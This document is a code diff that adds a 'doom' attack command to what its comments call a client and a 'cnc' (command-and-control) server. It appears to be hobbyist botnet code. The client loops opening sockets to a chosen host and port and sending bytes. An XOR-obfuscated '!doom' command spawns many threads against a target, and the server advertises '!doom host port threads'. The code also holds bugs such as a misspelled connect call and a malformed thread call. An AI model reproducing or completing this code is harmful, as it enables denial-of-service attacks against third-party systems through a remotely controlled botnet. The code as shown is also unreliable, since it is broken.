@@ -1,39 +1,38 @@
 #add to client and cnc
-import webbrowser 
+import webbrowser
 # url = 'https://www.youtube.com/watch?v=Tf1DEI2lEe0'
 # webbrowser.open_new_tab(url)
 
 #for client, add above handle function
 
 def doom(ip, url, port):
-  global stop
-  url= 'https://www.youtube.com/watch?v=Tf1DEI2lEe0'
-  while True:
-    if stop :
-            break
-    try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connet((str(ip),int(port)))
-            if int(port) == 80 or int(port) == 443
-                    ctx = ssl.SSLContext()
-                    s = ctx.wrap_socket(s,server_hostname=ip)
-                    webbrowser.open(url)#not sure this is the best way
-            connection = "Connection: Keep-Alive\r\n"
-            s.send("\000".encode())
-            s.close()
-      
+        global stop
+        url= 'https://www.youtube.com/watch?v=Tf1DEI2lEe0'
+        while True:
+                if stop :
+                        break
+                try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connet((str(ip),int(port)))
+                        if int(port) == 80 or int(port) == 443:
+                                ctx = ssl.SSLContext()
+                                s = ctx.wrap_socket(s,server_hostname=ip)
+                                webbrowser.open(url)#not sure this is the best way
+                        connection = "Connection: Keep-Alive\r\n"
+                        s.send("\000".encode())
+                        s.close()
+
 
 #open url command for client. should be added to the handle function
 elif command[0] == xor_dec('QBcLCQo=',key)#encoded word !doom
-  if attack != 0:
-    stop = True
-    attack = 0
-  stop= False
-  for _ in range(int(command[3])):
-    p= threading.Thread(target='HTTP' or 'HTTPS', args = command[1], command[2], command[3])#1=!volume, 2=ipaddress 3=port 80 or 443?
-    p.start()
-  attack+=1
+        if attack != 0:
+                stop = True
+                attack = 0
+        stop= False
+        for _ in range(int(command[3])):
+                p= threading.Thread(target='HTTP' or 'HTTPS', args = command[1], command[2], command[3])#1=!volume, 2=ipaddress 3=port 80 or 443?
+                p.start()
+        attack+=1
 
 #add in cnc line 242-256
-
 sock.send('Doom: !doom host port threads\r\n'.encode())#not sure what \r\n is, just a guess based on other formatting
